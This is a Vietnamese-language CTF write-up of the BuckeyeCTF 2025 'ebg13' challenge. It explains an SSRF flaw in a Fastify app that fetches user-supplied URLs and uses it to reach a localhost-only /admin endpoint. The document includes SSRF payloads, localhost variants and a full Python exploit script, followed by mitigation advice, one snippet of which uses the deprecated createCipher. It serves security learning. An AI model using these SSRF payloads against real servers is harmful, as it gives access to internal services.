# ebg13

## Challenge Description

```
Một ứng dụng web Fastify/Node.js thực hiện ROT13 encoding cho text nodes của HTML từ URL được cung cấp.
Endpoint /admin chỉ trả về flag khi request đến từ localhost (127.0.0.1).
```

**Files provided:**

- Source code Fastify application (server.js)
- Dockerfile
- package.json

**Challenge URL:** `https://ebg13.challs.pwnoh.io`

---

## Difficulty Assessment

### Overall Difficulty: Easy

**Breakdown:**

- **Technical Complexity:** ⭐⭐☆☆☆
- **Research Required:** ⭐☆☆☆☆
- **Time Consumption:** ⭐☆☆☆☆
- **Guessing Factor:** ⭐☆☆☆☆

**Why this difficulty?**
Bài này khá straightforward khi đọc source code. Chỉ cần nhận ra endpoint `/admin` kiểm tra IP và ứng dụng có chức năng fetch URL, sau đó áp dụng ROT13 decode để lấy flag.

---

## Topics & Techniques

### Primary Topic

- **Server-Side Request Forgery (SSRF)** - Khai thác chức năng fetch URL để truy cập localhost

### Sub-topics & Skills Required

- [x] **ROT13 Cipher** - Hiểu và decode ROT13 encoding
- [x] **Source Code Analysis** - Đọc và phân tích code để tìm lỗ hổng
- [x] **IP-based Access Control** - Hiểu cách bypass IP restriction thông qua SSRF
- [x] **Fastify/Node.js** - Hiểu về req.ip và localhost access

---

## Tools Used

### Essential Tools

```bash
# Browser để access challenge
curl "http://target/ebj13?url=http://127.0.0.1:3000/admin"

# Online ROT13 decoder
https://rot13.com/
```

### Tools List

| Tool          | Purpose          | Installation |
| ------------- | ---------------- | ------------ |
| Browser/cURL  | Testing payloads | Built-in     |
| ROT13 Decoder | Decode cipher    | Online tool  |
| CyberChef     | Decode cipher    | Online tool  |

---

## Useful Resources

### Documentation & References

- [ROT13 - Wikipedia](https://en.wikipedia.org/wiki/ROT13) - ROT13 cipher explanation
- [Fastify Request Object](https://fastify.dev/docs/latest/Reference/Request/) - Fastify req.ip documentation
- [SSRF Explained](https://portswigger.net/web-security/ssrf) - Server-Side Request Forgery

### Learning Materials

- [OWASP SSRF](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery) - SSRF attack overview
- [HackTricks SSRF](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery) - SSRF techniques

---

## Solution Walkthrough

### TL;DR (Quick Summary)

Khai thác SSRF thông qua endpoint `/ebj13?url=` để fetch `/admin` từ localhost. Response trả về flag đã được ROT13 encode. Decode bằng ROT13 để lấy flag gốc.

---

### Step 1: Source Code Analysis

**Objective:** Phân tích source code và tìm các endpoint quan trọng

Phân tích code cho thấy các endpoint:

```javascript
// Endpoint chính - fetch URL và apply ROT13
fastify.get("/ebj13", async (req, reply) => {
  const { url } = req.query;
  const res = await fetch(url); // ⚠️ SSRF vulnerability
  const html = await res.text();

  const $ = cheerio.load(html);
  rot13TextNodes($, $.root()); // Apply ROT13 to text nodes

  reply.type("text/html").send(modifiedHtml);
});

// Endpoint admin - chỉ accessible từ localhost
fastify.get("/admin", async (req, reply) => {
  if (
    req.ip === "127.0.0.1" ||
    req.ip === "::1" ||
    req.ip === "::ffff:127.0.0.1"
  ) {
    return reply.type("text/html").send(`Hello self! The flag is ${FLAG}.`);
  }

  return reply
    .type("text/html")
    .send(`Hello ${req.ip}, I won't give you the flag!`);
});
```

**Observations:**

- Endpoint `/admin` trả về flag khi `req.ip` là localhost
- Endpoint `/ebj13` cho phép fetch arbitrary URLs → SSRF
- ROT13 được apply lên text nodes của HTML response
- ROT13 là reversible cipher (ROT13(ROT13(x)) = x)

---

### Step 2: Exploiting SSRF

**Objective:** Sử dụng `/ebj13` để fetch `/admin` từ localhost

**Payload:**

```
/ebj13?url=http://127.0.0.1:3000/admin
```

**Giải thích:**

1. Server fetch `http://127.0.0.1:3000/admin` từ chính nó
2. Request đến từ localhost → `req.ip = "127.0.0.1"`
3. Điều kiện IP check satisfied → trả về flag
4. ROT13 được apply lên response trước khi gửi về client

**Response received:**

```
Uryyb frys! Gur synt vf opgs{jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys}.
```

---

### Step 3: Decoding ROT13

**Objective:** Decode ROT13 để lấy flag gốc

ROT13 cipher hoạt động bằng cách shift mỗi chữ cái 13 vị trí trong alphabet:

- A → N, B → O, C → P, ..., M → Z
- N → A, O → B, P → C, ..., Z → M

**Encoded text:**

```
Uryyb frys! Gur synt vf opgs{jung_unccraf_vs_v_hfr_guvf_jrofvgr_ba_vgfrys}.
```

**Decode process:**

```
U → H
r → e
y → l
y → l
b → o
...
```

**Decoded text:**

```
Hello self! The flag is bctf{what_happens_if_i_use_this_website_on_itself}.
```

---

### Step 4: Getting the Flag

**Final payload:**

```bash
curl "http://target/ebj13?url=http://127.0.0.1:3000/admin"
```

**Flag obtained:**

```
bctf{what_happens_if_i_use_this_website_on_itself}
```

---

## Complete Exploit Code

<details>
<summary>Click to expand full exploit code</summary>

```python
#!/usr/bin/env python3
"""
Exploit for ebg13 Challenge - BuckeyeCTF 2025
"""

import requests
import re

TARGET_URL = "http://challenge.ctf.com:port"

def rot13(text):
    """Decode ROT13 cipher"""
    result = []
    for char in text:
        if 'a' <= char <= 'z':
            result.append(chr((ord(char) - ord('a') + 13) % 26 + ord('a')))
        elif 'A' <= char <= 'Z':
            result.append(chr((ord(char) - ord('A') + 13) % 26 + ord('A')))
        else:
            result.append(char)
    return ''.join(result)

def exploit():
    print("[*] ebg13 CTF - SSRF + ROT13 Exploit")
    print("[*] Target:", TARGET_URL)

    # SSRF payload to access /admin from localhost
    ssrf_payload = "http://127.0.0.1:3000/admin"
    url = f"{TARGET_URL}/ebj13?url={ssrf_payload}"

    print(f"[*] Exploiting SSRF to access /admin from localhost")
    print(f"[*] Payload URL: {ssrf_payload}")

    try:
        response = requests.get(url)

        if response.status_code == 200:
            print("[+] SSRF successful!")
            print("[*] Encoded response:", response.text[:100] + "...")

            # Decode ROT13
            decoded = rot13(response.text)
            print("[*] Decoded response:", decoded[:100] + "...")

            # Extract flag
            flag_match = re.search(r'bctf\{[^}]+\}', decoded)

            if flag_match:
                flag = flag_match.group(0)
                print(f"\n[!] FLAG FOUND: {flag}\n")
            else:
                print("[-] Flag not found in decoded response")
        else:
            print(f"[-] Request failed with status code: {response.status_code}")

    except Exception as e:
        print(f"[-] Error: {str(e)}")

if __name__ == "__main__":
    exploit()
```

</details>

---

## Alternative Solutions

### Method 2: Using Different Localhost Addresses

```
/ebj13?url=http://localhost:3000/admin
/ebj13?url=http://[::1]:3000/admin
/ebj13?url=http://0.0.0.0:3000/admin
```

### Method 3: Manual ROT13 Decode

Sử dụng online tools:

- [rot13.com](https://rot13.com/)
- [CyberChef](<https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)>)

---

## Key Takeaways & Lessons Learned

### What I Learned

1. **SSRF Basics:** Khi ứng dụng cho phép fetch arbitrary URLs, có thể khai thác để access internal services (localhost, internal IPs).

2. **IP-based Access Control is Weak:** Kiểm tra `req.ip` không đủ an toàn nếu có SSRF vulnerability. Attacker có thể bypass bằng cách fetch từ chính server.

3. **ROT13 is Not Encryption:** ROT13 là simple substitution cipher, không phải encryption. Chỉ dùng cho obfuscation, không bảo mật.

4. **Reversible Transformations:** ROT13 có tính chất ROT13(ROT13(x)) = x, nên dễ dàng decode.

### Mistakes Made

- ❌ Thử access `/admin` trực tiếp → ✅ Nhận ra cần SSRF để bypass IP check
- ❌ Quên rằng response đã được ROT13 encode → ✅ Decode để lấy flag gốc

### Tips & Tricks

- 💡 Khi thấy IP-based access control + URL fetch functionality → nghĩ đến SSRF
- 💡 ROT13 có thể nhận diện bằng pattern: text trông như English nhưng không readable
- 💡 Luôn check localhost variants: 127.0.0.1, localhost, ::1, 0.0.0.0
- 💡 Đọc source code kỹ để hiểu data flow và transformations

### Real-world Application

SSRF là lỗ hổng nghiêm trọng trong production:

- Access internal services (databases, admin panels, cloud metadata)
- Port scanning internal network
- Bypass firewall và IP restrictions
- Đọc local files (với file:// protocol)

---

## Prevention & Mitigation

### How to prevent SSRF?

1. **Whitelist allowed domains:**

```javascript
// Bad code (vulnerable)
const res = await fetch(url);

// Good code (secure)
const allowedDomains = ["example.com", "trusted.com"];
const parsedUrl = new URL(url);

if (!allowedDomains.includes(parsedUrl.hostname)) {
  throw new Error("Domain not allowed");
}

const res = await fetch(url);
```

2. **Blacklist internal IPs:**

```javascript
function isInternalIP(hostname) {
  const internal = [
    "127.0.0.1",
    "localhost",
    "0.0.0.0",
    /^10\./, // 10.0.0.0/8
    /^172\.(1[6-9]|2[0-9]|3[01])\./, // 172.16.0.0/12
    /^192\.168\./, // 192.168.0.0/16
  ];

  return internal.some((pattern) => {
    if (typeof pattern === "string") {
      return hostname === pattern;
    }
    return pattern.test(hostname);
  });
}

if (isInternalIP(parsedUrl.hostname)) {
  throw new Error("Internal IP not allowed");
}
```

3. **Use network segmentation:**

```javascript
// Run fetching in isolated network/container
// Restrict outbound connections from application server
```

4. **Validate URL scheme:**

```javascript
const allowedSchemes = ["http:", "https:"];
if (!allowedSchemes.includes(parsedUrl.protocol)) {
  throw new Error("Protocol not allowed");
}
```

### Secure coding practices for ROT13

```javascript
// Bad: Using ROT13 for security
const secret = rot13("sensitive_data"); // ❌ Easily reversible

// Good: Use proper encryption
const crypto = require("crypto");
const secret = crypto
  .createCipher("aes-256-cbc", key)
  .update(data, "utf8", "hex");
```

### Better access control

```javascript
// Bad: Only IP-based
if (req.ip === "127.0.0.1") {
  // Allow access
}

// Good: Multiple layers
if (req.ip === "127.0.0.1" && req.headers["x-admin-token"] === SECRET_TOKEN) {
  // Allow access
}

// Better: Authentication + Authorization
if (isAuthenticated(req) && hasRole(req.user, "admin")) {
  // Allow access
}
```

---

## References & Credits

### Official Resources

- Challenge author: BuckeyeCTF 2025 Team
- Original challenge: ebg13

### Community Writeups

- This writeup by Copilot - 2025-11-14

### Tools & Libraries Used

- [Fastify](https://fastify.dev/) - Web framework
- [cheerio](https://cheerio.js.org/) - HTML parsing
- [ROT13.com](https://rot13.com/) - Online decoder
